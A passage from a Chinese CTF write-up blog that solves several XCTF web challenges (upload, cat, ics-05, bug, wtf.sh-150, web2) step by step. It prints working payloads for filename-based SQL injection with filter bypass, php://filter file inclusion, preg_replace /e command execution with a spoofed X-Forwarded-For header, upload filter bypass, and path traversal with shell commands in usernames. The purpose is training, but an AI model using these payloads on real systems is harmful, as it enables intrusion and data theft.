information_schema.TABLES where TABLE_SCHEMA = '</span>web_upload<span class="string">' limit 1,1)),13,12),16,10))+'</span>.jpg</span><br><span class="line">返回:</span><br><span class="line"><span class="number">112615676665705</span> 转<span class="number">16</span>进制再转字符得：flag_i</span><br><span class="line"></span><br><span class="line">lethe<span class="string">'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = '</span>web_upload<span class="string">' limit 1,1)),25,12),16,10))+'</span>.jpg</span><br><span class="line">返回:</span><br><span class="line"><span class="number">126853610566245</span> 转<span class="number">16</span>进制再转字符得：s_here</span><br><span class="line"></span><br><span class="line">拼接起来得知存放flag的表名为: hello_flag_is_here</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)然后查这个表里有什么字段:</span><br><span class="line"></span><br><span class="line">lethe<span class="string">'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = '</span>hello_flag_is_here<span class="string">' limit 0,1)),1,12),16,10))+'</span>.jpg</span><br><span class="line">返回:</span><br><span class="line"><span class="number">115858377367398</span> 转<span class="number">16</span>进制再转字符得：i_am_f</span><br><span class="line"></span><br><span class="line">lethe<span class="string">'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = '</span>hello_flag_is_here<span class="string">' limit 0,1)),13,12),16,10))+'</span>.jpg</span><br><span class="line">返回:</span><br><span class="line"><span class="number">7102823</span> 转<span class="number">16</span>进制再转字符得：lag</span><br><span class="line"></span><br><span class="line">拼接起来得知存放flag的字段是:i_am_flag</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)然后查询flag:</span><br><span class="line"></span><br><span class="line">lethe<span class="string">'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'</span>.jpg</span><br><span class="line">返回:</span><br><span class="line"><span class="number">36427215695199</span> 转<span class="number">16</span>进制再转字符得：!!_@m_</span><br><span class="line"></span><br><span class="line">lethe<span class="string">'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'</span>.jpg</span><br><span class="line">返回:</span><br><span class="line"><span class="number">92806431727430</span> 转<span class="number">16</span>进制再转字符得：Th.e_F</span><br><span class="line"></span><br><span class="line">lethe<span class="string">'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+'</span>.jpg</span><br><span class="line">返回:</span><br><span class="line"><span class="number">560750951</span> 转<span class="number">16</span>进制再转字符得：!lag</span><br><span class="line"></span><br><span class="line">拼起来之后得到flag: !!_@m_Th.e_F!lag</span><br></pre></td></tr></table></figure></p>
<p>(2)第二种方式，当你已经猜出了表的结构得适合，那就很简单了，某位大佬的wp中写出了表的结构为：<code>(filename,uid,uid)</code><br>先上传一个文件得到自己的<code>uid</code>:</p>
<p>这样就可以构造：<br><code>文件名&#39;,&#39;uid&#39;,&#39;uid&#39;),((database()),&#39;uid&#39;,&#39;uid&#39;)#.jpg</code></p>
<p>拼接后为：<br><code>...values (&#39;文件名&#39;,&#39;uid&#39;,&#39;uid&#39;),((database()),&#39;uid&#39;,&#39;uid&#39;)#.jpg     &#39;,&#39;uid&#39;,&#39;uid&#39;);</code><br>即：<br><code>...values (&#39;文件名&#39;,&#39;uid&#39;,&#39;uid&#39;),((database()),&#39;uid&#39;,&#39;uid&#39;)</code></p>
<p>这样再插入的时候就会多插入一列，这样就可以进行注入了。</p>
<p>如payload：<code>lethe&#39;,&#39;1665&#39;,&#39;1665&#39;),((database()),&#39;1665&#39;,&#39;1665&#39;)#.jpg</code><br><img src="/2019/05/21/攻防世界Web/20190518153226488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>最终payload</strong>：（我的uid为1665）<br><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>）查表名</span><br><span class="line">lethe<span class="string">','</span><span class="number">1665'</span>,<span class="string">'1665'</span>),(( <span class="function">selselectect <span class="title">group_concat</span>(<span class="params">table_name</span>) frfromom information_schema.tables <span class="keyword">where</span> table_schema</span> = <span class="string">'web_upload'</span>),<span class="string">'1665'</span>,<span class="string">'1665'</span>)<span class="meta">#.jpg</span></span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）查列名</span><br><span class="line">lethe<span class="string">','</span><span class="number">1665'</span>,<span class="string">'1665'</span>),(( <span class="function">seselectlect <span class="title">group_concat</span>(<span class="params">column_name</span>) frfromom information_schema.columns <span class="keyword">where</span> table_name</span>= <span class="string">'hello_flag_is_here'</span> ),<span class="string">'1665'</span>,<span class="string">'1665'</span>)<span class="meta">#.jpg</span></span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>）查flag</span><br><span class="line">lethe<span class="string">','</span><span class="number">1665'</span>,<span class="string">'1665'</span>),(( seselectlect i_am_flag frfromom hello_flag_is_here),<span class="string">'1665'</span>,<span class="string">'1665'</span>)<span class="meta">#.jpg</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/05/21/攻防世界Web/20190518154938423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="cat（XCTF-4th-WHCTF-2017）"><a href="#cat（XCTF-4th-WHCTF-2017）" class="headerlink" title="cat（XCTF 4th-WHCTF-2017）"></a>cat（XCTF 4th-WHCTF-2017）</h1><p>1、进入页面，提示要求我们可以输入域名并进行请求，如下：</p>
<p><img src="/2019/05/21/攻防世界Web/20190803012132442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>2、测试一下可以发现：</p>
<ul>
<li>正常 URL，返回 ping 结果</li>
<li>非法 URL、特殊符号，返回 Invalid URL</li>
</ul>
<p>3、这里Django调试模式打开了，发现如果在输入框中值包含url编码，在<code>?url=</code>中请求大于<code>%7F</code>的字符都会造成Django报错。</p>
<p>4、在url中输入<code>?url=%80</code>,可以得到报错页面:<br><img src="/2019/05/21/攻防世界Web/20190803020706353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>5、报错信息非常多，大概看一下，可以发现环境信息：<br><img src="/2019/05/21/攻防世界Web/20190803021000674.png" alt="在这里插入图片描述"><br>可能觉得奇怪，是<code>.php</code>的页面，却报<code>python</code>的<code>django debug</code>错误，所以，判断是一个PHP调用Python的站。</p>
<p>比赛时给了提示：<code>RTFM of PHP CURL===&gt;&gt;read the fuck manul of PHP CURL???</code></p>
<p>所以应该是PHP通过cURL向django的站发送数据，那边处理完再将数据传回。</p>
<p>那就看一下CURLmanul ：<br><img src="/2019/05/21/攻防世界Web/20190803021722377.png" alt="在这里插入图片描述"><br>即使用<code>@</code>进行文件传递，如果文件内容中有上述超出编码范围的字符，就会产生报错信息，实际上包含中文就会报错。</p>
<p>6、于是就继续在刚才的报错信息里找找看有没有比较关键的信息文件，先考虑数据库相关的，搜索关键词<code>sql</code>，可以看到：<br><img src="/2019/05/21/攻防世界Web/20190803022043530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>7、于是请求<code>?url=@/opt/api/database.sqlite3</code>,又发现报错信息，在报错信息中搜索关键词<code>ctf</code>就能看到flag。<br><img src="/2019/05/21/攻防世界Web/20190803022530665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="ics-05（XCTF-4th-CyberEarth）"><a href="#ics-05（XCTF-4th-CyberEarth）" class="headerlink" title="ics-05（XCTF 4th-CyberEarth）"></a>ics-05（XCTF 4th-CyberEarth）</h1><p>1、进入页面后发现大部分功能都是装饰没用的，只有“设备维护中心”的页面可以进去，发现url变成了<code>index.php?page=index</code>，并且页面上会显示index。<br><img src="/2019/05/21/攻防世界Web/20190811202050268.png" alt="在这里插入图片描述"></p>
<p>2、所以先考虑文件包含，很常用的payload了：<br><code>?page=php://filter/read=convert.base64-encode/resource=index.php</code>，base64解码后得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">--------------------------html code--------------------------</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$page = $_GET[page];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($page)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctype_alnum($page)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">"text-align:center"</span>&gt;</span><br><span class="line">        &lt;p class="lead"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;div style=<span class="string">"text-align:center"</span>&gt;</span><br><span class="line">            &lt;p class="lead"&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'input'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'ta:text'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'text'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ($page === <span class="string">'index.php'</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Ok'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">include</span>($page);</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¹ä¾¿çå®ç°è¾å</span></span><br><span class="line">¥è¾åºçåè½,æ­£å¨å¼åä¸­çåè½ï¼åªè½å</span><br><span class="line">é¨äººåæµè¯</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>3、简单审计一下代码，重点在最后一部分：</p>
<ul>
<li><p>首先要伪造X-Forwarded-For为127.0.0.1。</p>
</li>
<li><p>然后要以GET方法传入<code>pat</code>、<code>rep</code>、<code>sub</code>三个参数，这三个参数的值分别作为<code>preg_replace()</code>函数的参数<code>preg_replace($pattern, $replacement, $subject)</code>，<code>pattern</code>为要搜索的模式，<code>replacement</code>为用于替换的字符串或字符串数组，<code>subject</code>要进行搜索和替换的字符串或字符串数组。</p>
</li>
<li><p><code>pattern</code>参数可以使用一些PCRE修饰符，其中：<br><img src="/2019/05/21/攻防世界Web/20190811203651571.png" alt="在这里插入图片描述"><br>即<code>/e</code> 修正符使 <code>preg_replace()</code>将<code>replacement</code>参数当作 PHP 代码</p>
</li>
</ul>
<p>4、这里我们三个参数都可控，那么构造payload：<code>?pat=/Lethe/e&amp;rep=system(&#39;cat s3chahahaDir/flag/flag.php&#39;)&amp;sub=Lethe</code>，同时伪造X-Forwarded-For，即可看到flag在源码中。<br><img src="/2019/05/21/攻防世界Web/20190811210014235.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="bug（RCTF-2015）"><a href="#bug（RCTF-2015）" class="headerlink" title="bug（RCTF-2015）"></a>bug（RCTF-2015）</h1><p>1、进入页面后首先按它的要求注册一个用户，登陆进去之后，发现Manage功能只有admin账户才能访问：<br><img src="/2019/05/21/攻防世界Web/20190811225311787.png" alt="在这里插入图片描述"></p>
<p>2、主界面除了登陆和注册以外，还可以通过注册是输入的Username、Birthday和Address进行密码找回，在自己的账户上发现还有Personal页面会显示注册时的信息，且url中会有此账号的uid，尝试将uid改为1，发现并不可以..<br><img src="/2019/05/21/攻防世界Web/20190811225626433.png" alt="在这里插入图片描述"></p>
<p>3、于是使用找回密码功能对自己的账户进行密码找回，输入正确的信息（中途发现三个信息只要正确两个，就可以修改密码了，于是尝试了对admin的Birthday进行爆破，但也无果…），正确输入信息后进入如下页面：<br><img src="/2019/05/21/攻防世界Web/20190811230111884.png" alt="在这里插入图片描述"></p>
<p>然后输入要修改的密码并抓包，尝试把Username改为admin，发现成功：<br><img src="/2019/05/21/攻防世界Web/20190811230250893.png" alt="在这里插入图片描述"></p>
<p>4、登陆admin账号，访问manager功能显示<code>IP Not allowed！</code>，将XXF伪造为127.0.0.1后即可<br><img src="/2019/05/21/攻防世界Web/20190811230525691.png" alt="在这里插入图片描述"><br>5、再源码中看到提示：<code>?module=filemanage&amp;do=???</code>，有module想到do应该时<code>upload</code>，访问<code>/index.php?module=filemanage&amp;do=upload</code>可以看到一个上传页面<br><img src="/2019/05/21/攻防世界Web/20190811230730921.png" alt="在这里插入图片描述"></p>
<p>6、这里不仅对后缀进行了黑名单过滤，同时会检查文件的开头内容，所以不能以<code>&lt;?php</code>开头，可以用<code>&lt;script language=&quot;php&quot;&gt;  ... php code... &lt;/script&gt;</code>来进行绕过，先以<code>jpg</code>后缀上传，抓包改后缀为<code>php5</code>或<code>php4</code>，即可看到flag。<br><img src="/2019/05/21/攻防世界Web/20190811231446640.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="wtf-sh-150（csaw-ctf-2016-quals）"><a href="#wtf-sh-150（csaw-ctf-2016-quals）" class="headerlink" title="wtf.sh-150（csaw-ctf-2016-quals）"></a>wtf.sh-150（csaw-ctf-2016-quals）</h1><h6 id="Get-flag1"><a href="#Get-flag1" class="headerlink" title="Get flag1"></a>Get flag1</h6><p>1、进入页面后，是一个类似论坛系统，先注册个账号（注册的时候随手测试一下，存在admin账户），还发现网页的后缀是<code>.wtf</code>。</p>
<p>2、根据以往的思路，论坛系统+存在admin，应该就是想办法以admin登陆了呗，尝试一番未果，试了几个功能，注意到url的形式有<code>/profile.wtf?user=..</code>和<code>/post.wtf?post=K8laH</code>有点像文件包含，测试发现存在目录跳转，可以任意读取文件。<br><img src="/2019/05/21/攻防世界Web/20190814004433668.png" alt="在这里插入图片描述"></p>
<p>4、<code>/post.wtf?post=../../</code>发现所有的源码会被显示在网页上，搜索关键词flag：<br><img src="/2019/05/21/攻防世界Web/20190814005407861.png" alt="在这里插入图片描述"><br>源码如下，是一段bash脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">$ <span class="keyword">if</span> contains <span class="string">'user'</span> <span class="variable">$&#123;!URL_PARAMS[@]&#125;</span> &amp;&amp; file_exists <span class="string">"users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>"</span></span><br><span class="line">$ <span class="keyword">then</span></span><br><span class="line">$   <span class="built_in">local</span> username=$(head -n 1 users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>);</span><br><span class="line">$   <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;<span class="variable">$&#123;username&#125;</span>'s posts:&lt;/h3&gt;"</span>;</span><br><span class="line">$   <span class="built_in">echo</span> <span class="string">"&lt;ol&gt;"</span>;</span><br><span class="line">$   get_users_posts <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span> | <span class="keyword">while</span> <span class="built_in">read</span> -r post; <span class="keyword">do</span></span><br><span class="line">$       post_slug=$(awk -F/ <span class="string">'&#123;print $2 "#" $3&#125;'</span> &lt;&lt;&lt; <span class="string">"<span class="variable">$&#123;post&#125;</span>"</span>);</span><br><span class="line">$       <span class="built_in">echo</span> <span class="string">"&lt;li&gt;&lt;a href=\"/post.wtf?post=<span class="variable">$&#123;post_slug&#125;</span>\"&gt;<span class="variable">$(nth_line 2 "$&#123;post&#125;" | htmlentities)</span>&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line">$   <span class="keyword">done</span> </span><br><span class="line">$   <span class="built_in">echo</span> <span class="string">"&lt;/ol&gt;"</span>;</span><br><span class="line">$   <span class="keyword">if</span> is_logged_in &amp;&amp; [[ <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> = <span class="string">'admin'</span> ]] &amp;&amp; [[ <span class="variable">$&#123;username&#125;</span> = <span class="string">'admin'</span> ]]</span><br><span class="line">$   <span class="keyword">then</span></span><br><span class="line">$       get_flag1</span><br><span class="line">$   <span class="keyword">fi</span></span><br><span class="line">$ <span class="keyword">fi</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>稍微看一下，发现果然是以admin身份登陆，就能拿到flag1了。</p>
<p>5、于是抓包一下注册的账户，发现Cookie中有Token字段，应该是要通过文件读取拿到admin的Token进行伪造登陆：<br><img src="/2019/05/21/攻防世界Web/20190814005736586.png" alt="在这里插入图片描述"><br>源码中还提到了<code>/users</code>目录，于是构造<code>/post.wtf?post=../users</code>即可读到：<br><img src="/2019/05/21/攻防世界Web/20190814005958201.png" alt="在这里插入图片描述"><br>伪造Cookie成功登陆，看到flag1：<br><img src="/2019/05/21/攻防世界Web/20190814010433593.png" alt="在这里插入图片描述"></p>
<h6 id="Get-flag2"><a href="#Get-flag2" class="headerlink" title="Get flag2"></a>Get flag2</h6><p>参考：<a href="https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh" target="_blank" rel="noopener">https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh</a></p>
<p>下面就要获取flag2了，现在就只有再看看获取到的源码，发现如下代码，前面说了网站的后缀是<code>.wtf</code>，解析wtf文件的源码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">max_page_include_depth=64</span><br><span class="line">page_include_depth=0</span><br><span class="line"><span class="keyword">function</span> include_page &#123;</span><br><span class="line">    <span class="comment"># include_page pathname</span></span><br><span class="line">    <span class="built_in">local</span> pathname=<span class="variable">$1</span></span><br><span class="line">    <span class="built_in">local</span> cmd=</span><br><span class="line">    [[ <span class="variable">$&#123;pathname(-4)&#125;</span> = <span class="string">'.wtf'</span> ]];</span><br><span class="line">    <span class="built_in">local</span> can_execute=$;</span><br><span class="line">    page_include_depth=$((<span class="variable">$page_include_depth</span>+1))</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$page_include_depth</span> -lt <span class="variable">$max_page_include_depth</span> ]]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">local</span> line;</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">            <span class="comment"># check if we're in a script line or not ($ at the beginning implies script line)</span></span><br><span class="line">            <span class="comment"># also, our extension needs to be .wtf</span></span><br><span class="line">            [[ $ = <span class="variable">$&#123;line01&#125;</span> &amp;&amp; <span class="variable">$&#123;can_execute&#125;</span> = 0 ]];</span><br><span class="line">            is_script=$;</span><br><span class="line">            <span class="comment"># execute the line.</span></span><br><span class="line">            <span class="keyword">if</span> [[ <span class="variable">$is_script</span> = 0 ]]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                cmd+=$<span class="string">'n'</span><span class="variable">$&#123;line#$&#125;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span> [[ -n <span class="variable">$cmd</span> ]]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">                    <span class="built_in">eval</span> <span class="variable">$cmd</span>  <span class="built_in">log</span> Error during execution of <span class="variable">$&#123;cmd&#125;</span>;</span><br><span class="line">                    cmd=</span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$line</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">done</span>  <span class="variable">$&#123;pathname&#125;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> pMax include depth exceeded!p</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由上述代码可知，<code>.wtf</code>扩展名的文件，内容若以<code>$</code>开头，即可执行后面的命令。</p>
<p>再在post_functions.sh文件中看到reply功能的源码：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> reply &#123;</span><br><span class="line">    <span class="built_in">local</span> post_id=<span class="variable">$1</span>;</span><br><span class="line">    <span class="built_in">local</span> username=<span class="variable">$2</span>;</span><br><span class="line">    <span class="built_in">local</span> text=<span class="variable">$3</span>;</span><br><span class="line">    <span class="built_in">local</span> hashed=$(hash_username <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span>);</span><br><span class="line">    curr_id=$(<span class="keyword">for</span> d <span class="keyword">in</span> posts/<span class="variable">$&#123;post_id&#125;</span>/*; <span class="keyword">do</span> basename <span class="variable">$d</span>; <span class="keyword">done</span> | sort -n | tail -n 1);</span><br><span class="line">    next_reply_id=$(awk <span class="string">'&#123;print $1+1&#125;'</span> &lt;&lt;&lt; <span class="string">"<span class="variable">$&#123;curr_id&#125;</span>"</span>);</span><br><span class="line">    next_file=(posts/<span class="variable">$&#123;post_id&#125;</span>/<span class="variable">$&#123;next_reply_id&#125;</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span> &gt; <span class="string">"<span class="variable">$&#123;next_file&#125;</span>"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"RE: <span class="variable">$(nth_line 2 &lt; "posts/$&#123;post_id&#125;/1")</span>"</span> &gt;&gt; <span class="string">"<span class="variable">$&#123;next_file&#125;</span>"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;text&#125;</span>"</span> &gt;&gt; <span class="string">"<span class="variable">$&#123;next_file&#125;</span>"</span>;</span><br><span class="line">    <span class="comment"># add post this is in reply to to posts cache</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;post_id&#125;</span>/<span class="variable">$&#123;next_reply_id&#125;</span>"</span> &gt;&gt; <span class="string">"users_lookup/<span class="variable">$&#123;hashed&#125;</span>/posts"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在reply功能中，当你回复帖子时，会通过GET方式提交post参数传递帖子ID ，并且这个参数也存在目录遍历漏洞，这样就可以在我们想要的地方输出创建文件了。除此之外，该函数还会将用户名写入该文件中。</p>
<p>因此，我们可以注册一个以shell命令为用户名的账户，并使用reply功能将其写入创建的<code>.wtf</code>文件，就可以进行命令执行。</p>
<p>该函数还在文件的第一行写了用户名。因此，如果我们只是注册了一个包含有效shell命令的用户名，并将其写入以.wtf结尾的文件到我们可以访问该文件的目录中，那么就会给我们执行代码。发现users_lookup目录没有包含<code>.noread</code>文件，因此我们可以将.wtf文件写入users_lookup。</p>
<p>还有一点需要注意，在注册的时候，用户名中如果出现空格则会出现一些错误，可以用<code>,</code>进行绕过，因此注册用户名为：<code>${find,/,-iname,get_flag2}</code>的账户，在reply的时候抓包并修改post参数如下：<br><img src="/2019/05/21/攻防世界Web/20190814015029752.png" alt="在这里插入图片描述"><br><strong>注意上面的<code>%09</code>为水平制表符，必须要加上，否则会将名称解释为目录名称。</strong></p>
<p>然后访问<code>/users_lookup/lethe.wtf</code>得到：<br><img src="/2019/05/21/攻防世界Web/2019081401563538.png" alt="在这里插入图片描述"></p>
<p>最后，再注册一个用户名为<code>$/usr/bin/get_flag2</code>的账户，重复上述步骤即可。<br><img src="/2019/05/21/攻防世界Web/20190814015929444.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="web2（NSCTF）"><a href="#web2（NSCTF）" class="headerlink" title="web2（NSCTF）"></a>web2（NSCTF）</h1><p>1、进入题目后给出了一个加密函数的源码，思路也直接告诉你了，逆出解密函数，将密文解密出来即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123; </span><br><span class="line">    $_o=strrev($str); </span><br><span class="line">    <span class="comment">// echo $_o; </span></span><br><span class="line">         </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123; </span><br><span class="line">        </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>); </span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>; </span><br><span class="line">        $_c=chr($__); </span><br><span class="line">        $_=$_.$_c;    </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_))); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>（2）大概审计一些代码，加密流程并不复杂，即:<code>反转字符串 =&gt; 每个字符的ASCII加1 =&gt; base64编码 =&gt; 反转字符串 =&gt; rot13编码</code></p>
<p>所以解密流程反着来就行了，即：<code>rot13解码 =&gt; 反转字符串 =&gt; base64解码 =&gt; 每个字符的ASCII加1 =&gt; 反转字符串</code></p>
<p>（对rot13编码过的字符串在进行一次rot13编码即为解码）</p>
<p>解密脚本如下：</p>
